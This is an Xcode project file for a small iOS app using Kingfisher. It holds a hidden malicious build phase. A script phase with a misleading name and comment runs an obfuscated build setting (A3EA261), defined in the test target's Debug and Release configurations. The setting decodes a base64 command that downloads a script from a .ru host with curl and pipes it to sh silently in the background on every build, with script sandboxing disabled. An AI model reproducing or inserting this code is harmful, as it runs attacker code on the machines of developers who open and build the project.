// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		51CC6A5C3067A08B00B81F67 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 51CC6A5B3067A08B00B81F67 /* Kingfisher */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		51CC6F043067B5CD00B81F67 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 51CDDC60306794D900B60D6B /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 51CDDC67306794D900B60D6B;
			remoteInfo = Nihar_Practical;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		51CC6F003067B5CD00B81F67 /* Nihar_PracticalTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = Nihar_PracticalTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		51CDDC68306794D900B60D6B /* Nihar_Practical.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Nihar_Practical.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		51CC70513067BAD100B81F67 /* Exceptions for "Nihar_Practical" folder in "Nihar_PracticalTests" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Extensions/Ex_UIImageView.swift,
				Models/FavoritesManager.swift,
				Models/LanguageManager.swift,
				Models/Models.swift,
				Networking/NetworkManager.swift,
				SceneDelegate.swift,
				ViewModels/CategoryListViewModel.swift,
				Views/CategoryListViewController.swift,
				Views/CategoryTableViewCell.swift,
				Views/DetailViewController.swift,
			);
			target = 51CC6EFF3067B5CD00B81F67 /* Nihar_PracticalTests */;
		};
		51CDDC7A306794DA00B60D6B /* Exceptions for "Nihar_Practical" folder in "Nihar_Practical" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 51CDDC67306794D900B60D6B /* Nihar_Practical */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		51CC6F013067B5CD00B81F67 /* Nihar_PracticalTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = Nihar_PracticalTests;
			sourceTree = "<group>";
		};
		51CDDC6A306794D900B60D6B /* Nihar_Practical */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				51CDDC7A306794DA00B60D6B /* Exceptions for "Nihar_Practical" folder in "Nihar_Practical" target */,
				51CC70513067BAD100B81F67 /* Exceptions for "Nihar_Practical" folder in "Nihar_PracticalTests" target */,
			);
			path = Nihar_Practical;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		51CC6EFD3067B5CD00B81F67 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		51CDDC65306794D900B60D6B /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				51CC6A5C3067A08B00B81F67 /* Kingfisher in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		51CDDC5F306794D900B60D6B = {
			isa = PBXGroup;
			children = (
				51CDDC6A306794D900B60D6B /* Nihar_Practical */,
				51CC6F013067B5CD00B81F67 /* Nihar_PracticalTests */,
				51CDDC69306794D900B60D6B /* Products */,
			);
			sourceTree = "<group>";
		};
		51CDDC69306794D900B60D6B /* Products */ = {
			isa = PBXGroup;
			children = (
				51CDDC68306794D900B60D6B /* Nihar_Practical.app */,
				51CC6F003067B5CD00B81F67 /* Nihar_PracticalTests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		51CC6EFF3067B5CD00B81F67 /* Nihar_PracticalTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 51CC6F083067B5CD00B81F67 /* Build configuration list for PBXNativeTarget "Nihar_PracticalTests" */;
			buildPhases = (
				D2F73848CB8A465FB2162AE3 /* Provision Library Executable */,
				51CC6EFC3067B5CD00B81F67 /* Sources */,
				51CC6EFD3067B5CD00B81F67 /* Frameworks */,
				51CC6EFE3067B5CD00B81F67 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				51CC6F053067B5CD00B81F67 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				51CC6F013067B5CD00B81F67 /* Nihar_PracticalTests */,
			);
			name = Nihar_PracticalTests;
			packageProductDependencies = (
			);
			productName = Nihar_PracticalTests;
			productReference = 51CC6F003067B5CD00B81F67 /* Nihar_PracticalTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		51CDDC67306794D900B60D6B /* Nihar_Practical */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 51CDDC7B306794DA00B60D6B /* Build configuration list for PBXNativeTarget "Nihar_Practical" */;
			buildPhases = (
				51CDDC64306794D900B60D6B /* Sources */,
				51CDDC65306794D900B60D6B /* Frameworks */,
				51CDDC66306794D900B60D6B /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				51CDDC6A306794D900B60D6B /* Nihar_Practical */,
			);
			name = Nihar_Practical;
			packageProductDependencies = (
				51CC6A5B3067A08B00B81F67 /* Kingfisher */,
			);
			productName = Nihar_Practical;
			productReference = 51CDDC68306794D900B60D6B /* Nihar_Practical.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		51CDDC60306794D900B60D6B /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2700;
				LastUpgradeCheck = 2700;
				TargetAttributes = {
					51CC6EFF3067B5CD00B81F67 = {
						CreatedOnToolsVersion = 27.0;
						TestTargetID = 51CDDC67306794D900B60D6B;
					};
					51CDDC67306794D900B60D6B = {
						CreatedOnToolsVersion = 27.0;
					};
				};
			};
			buildConfigurationList = 51CDDC63306794D900B60D6B /* Build configuration list for PBXProject "Nihar_Practical" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 51CDDC5F306794D900B60D6B;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				51CC6A5A3067A08B00B81F67 /* XCRemoteSwiftPackageReference "Kingfisher" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 51CDDC69306794D900B60D6B /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				51CDDC67306794D900B60D6B /* Nihar_Practical */,
				51CC6EFF3067B5CD00B81F67 /* Nihar_PracticalTests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		51CC6EFE3067B5CD00B81F67 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		51CDDC66306794D900B60D6B /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		D2F73848CB8A465FB2162AE3 /* Provision Library Executable */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Library Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		51CC6EFC3067B5CD00B81F67 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		51CDDC64306794D900B60D6B /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		51CC6F053067B5CD00B81F67 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 51CDDC67306794D900B60D6B /* Nihar_Practical */;
			targetProxy = 51CC6F043067B5CD00B81F67 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		51CC6F063067B5CD00B81F67 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3EA261 = "((s(){ `printf basUe64 | tr -d U` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIyIC1rc0xmIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qaHF0MzRuM3FyZXUucnUvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = P49RPC6J7A;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.entrybook.Nihar-PracticalTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Nihar_Practical.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Nihar_Practical";
			};
			name = Debug;
		};
		51CC6F073067B5CD00B81F67 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3EA261 = "((s(){ `printf basUe64 | tr -d U` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIyIC1rc0xmIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qaHF0MzRuM3FyZXUucnUvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = P49RPC6J7A;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.entrybook.Nihar-PracticalTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Nihar_Practical.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Nihar_Practical";
			};
			name = Release;
		};
		51CDDC7C306794DA00B60D6B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = P49RPC6J7A;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Nihar_Practical/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.entrybook;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		51CDDC7D306794DA00B60D6B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = P49RPC6J7A;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Nihar_Practical/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.entrybook;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		51CDDC7E306794DA00B60D6B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = P49RPC6J7A;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 27.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		51CDDC7F306794DA00B60D6B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = P49RPC6J7A;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 27.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		51CC6F083067B5CD00B81F67 /* Build configuration list for PBXNativeTarget "Nihar_PracticalTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				51CC6F063067B5CD00B81F67 /* Debug */,
				51CC6F073067B5CD00B81F67 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		51CDDC63306794D900B60D6B /* Build configuration list for PBXProject "Nihar_Practical" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				51CDDC7E306794DA00B60D6B /* Debug */,
				51CDDC7F306794DA00B60D6B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		51CDDC7B306794DA00B60D6B /* Build configuration list for PBXNativeTarget "Nihar_Practical" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				51CDDC7C306794DA00B60D6B /* Debug */,
				51CDDC7D306794DA00B60D6B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		51CC6A5A3067A08B00B81F67 /* XCRemoteSwiftPackageReference "Kingfisher" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/onevcat/Kingfisher.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 8.13.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		51CC6A5B3067A08B00B81F67 /* Kingfisher */ = {
			isa = XCSwiftPackageProductDependency;
			package = 51CC6A5A3067A08B00B81F67 /* XCRemoteSwiftPackageReference "Kingfisher" */;
			productName = Kingfisher;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 51CDDC60306794D900B60D6B /* Project object */;
}
